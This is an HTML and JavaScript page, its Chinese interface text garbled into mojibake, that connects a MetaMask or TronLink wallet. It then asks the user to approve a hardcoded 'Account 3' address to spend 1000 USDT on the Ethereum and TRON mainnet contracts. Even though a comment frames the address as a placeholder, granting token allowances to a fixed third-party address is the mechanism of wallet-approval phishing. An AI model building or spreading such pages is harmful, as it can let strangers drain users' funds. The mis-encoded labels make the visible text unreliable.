<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <title>è·¨é“¾æˆæƒï¼šUSDTï¼ˆMetaMask & TronLinkï¼‰</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: auto;
      padding: 20px;
      background-color: #f5f5f5;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    button {
      padding: 10px 20px;
      margin: 10px 0;
      font-size: 16px;
      cursor: pointer;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
    }
    button:hover {
      background: #45a049;
    }
    .info {
      margin: 10px 0;
      padding: 10px;
      background: #e8f5e8;
      border-left: 4px solid #4CAF50;
    }
    .warning {
      background: #fff8e1;
      border-left: 4px solid #ff9800;
      color: #e65100;
    }
    .error {
      color: red;
      background: #ffebee;
      padding: 10px;
      border-left: 4px solid #f44336;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ğŸ” è·¨é“¾æˆæƒ USDT</h2>
    <p>æ”¯æŒ MetaMaskï¼ˆETH-USDTï¼‰å’Œ TronLinkï¼ˆTRON-USDTï¼‰</p>

    <button id="connect">è¿æ¥é’±åŒ…</button>
    <div id="accountInfo"></div>
    <div id="chainInfo"></div>
    <!-- ç§»é™¤äº† ownerCheck åŒºåŸŸï¼ˆUSDT æ—  ownerï¼‰ -->

    <button id="approve" disabled>æˆæƒ 1000 USDT ç»™ Account 3</button>
    <div id="result"></div>
  </div>

  <!-- å¼•å…¥ SDK -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.1.0/dist/TronWeb.min.js"></script>

  <script>
    // ===================
    // é…ç½®ï¼šUSDT è·¨é“¾åœ°å€ï¼ˆå®˜æ–¹ï¼‰
    // ===================
    const CONFIG = {
      ethereum: {
        token: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH-USDT
        account3: "0x7d9a039c1b59b29e7c6a41aa4889c8db8e0b672d", // â† æ›¿æ¢ä¸ºä½ çš„ ETH æ¥æ”¶åœ°å€
        decimals: 6,
        chainId: 1
      },
      tron: {
        token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON-USDT
        account3: "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3", // TRON æ¥æ”¶åœ°å€
        decimals: 6,
        chainId: "mainnet"
      }
    };

    let currentChain = null;
    let signerOrTronWeb = null;

    // ===================
    // è¿æ¥é’±åŒ…
    // ===================
    document.getElementById("connect").onclick = async () => {
      const resultDiv = document.getElementById("result");
      resultDiv.innerHTML = "";

      if (typeof window.tronWeb !== 'undefined') {
        currentChain = 'tron';
        // ç¡®ä¿ TronWeb å®Œå…¨æ³¨å…¥
        if (!window.tronWeb.ready) {
          resultDiv.innerHTML = `<div class="error">è¯·ç­‰å¾… TronLink å®Œå…¨åŠ è½½</div>`;
          return;
        }
        await handleTronConnect();
      } else if (typeof window.ethereum !== 'undefined') {
        currentChain = 'ethereum';
        try {
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          await provider.send("eth_requestAccounts", []);
          signerOrTronWeb = provider.getSigner();
          await handleEthConnect();
        } catch (err) {
          resultDiv.innerHTML = `<div class="error">MetaMask è¿æ¥è¢«æ‹’ç»</div>`;
        }
      } else {
        resultDiv.innerHTML = `<div class="error">è¯·å®‰è£… MetaMask æˆ– TronLink é’±åŒ…</div>`;
      }
    };

    async function handleEthConnect() {
      try {
        const addr = await signerOrTronWeb.getAddress();
        document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… ETH è´¦æˆ·ï¼š${addr}</div>`;
        document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šEthereum</div>`;
        // USDT æ—  ownerï¼Œç›´æ¥å¯ç”¨æŒ‰é’®
        document.getElementById("approve").disabled = false;
        document.getElementById("result").innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
      } catch (err) {
        document.getElementById("result").innerHTML = `<div class="error">ETH è¿æ¥å¤±è´¥ï¼š${err.message}</div>`;
      }
    }

    async function handleTronConnect() {
      try {
        // âœ… å®˜æ–¹æ¨èï¼šä¸»åŠ¨è¯·æ±‚è´¦æˆ·
        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
        const addr = accounts[0];

        // æ›´æ–°å…¨å±€ tronWeb å®ä¾‹ï¼ˆç¡®ä¿æœ€æ–°ï¼‰
        signerOrTronWeb = window.tronWeb;

        document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… TRON è´¦æˆ·ï¼š${addr}</div>`;
        document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šTRON</div>`;
        // USDT æ—  ownerï¼Œç›´æ¥å¯ç”¨æŒ‰é’®
        document.getElementById("approve").disabled = false;
        document.getElementById("result").innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
      } catch (err) {
        console.error("TronLink è¯·æ±‚å¤±è´¥", err);
        document.getElementById("result").innerHTML = `<div class="error">âŒ è¯·æˆæƒ TronLink è´¦æˆ·</div>`;
      }
    }

    // ===================
    // æˆæƒæ“ä½œï¼ˆå®‰å…¨å¤„ç†ï¼‰
    // ===================
    document.getElementById("approve").onclick = async () => {
      const cfg = CONFIG[currentChain];
      const amountStr = "1000";
      let tx;

      try {
        if (currentChain === 'ethereum') {
          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals);
          const contract = new ethers.Contract(
            cfg.token,
            ["function approve(address,uint256) external returns (bool)"],
            signerOrTronWeb
          );
          tx = await contract.approve(cfg.account3, amount);
          await tx.wait();
        } else {
          // TRON: å®‰å…¨é‡‘é¢å¤„ç†
          const amount = ethers.utils.parseUnits(amountStr, cfg.decimals).toString();
          const contract = await signerOrTronWeb.contract().at(cfg.token);
          tx = await contract.approve(cfg.account3, amount).send({
            feeLimit: 100_000_000
          });
        }

        document.getElementById("result").innerHTML = `<div class="info">âœ… æˆæƒæˆåŠŸï¼<br>äº¤æ˜“ ID: ${tx}</div>`;
      } catch (err) {
        console.error("æˆæƒå¤±è´¥", err);
        let msg = err.reason || err.message || String(err);
        if (msg.includes("user denied")) {
          msg = "ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“";
        }
        document.getElementById("result").innerHTML = `<div class="error">âŒ æˆæƒå¤±è´¥ï¼š<br>${msg}</div>`;
      }
    };
  </script>
</body>
</html>
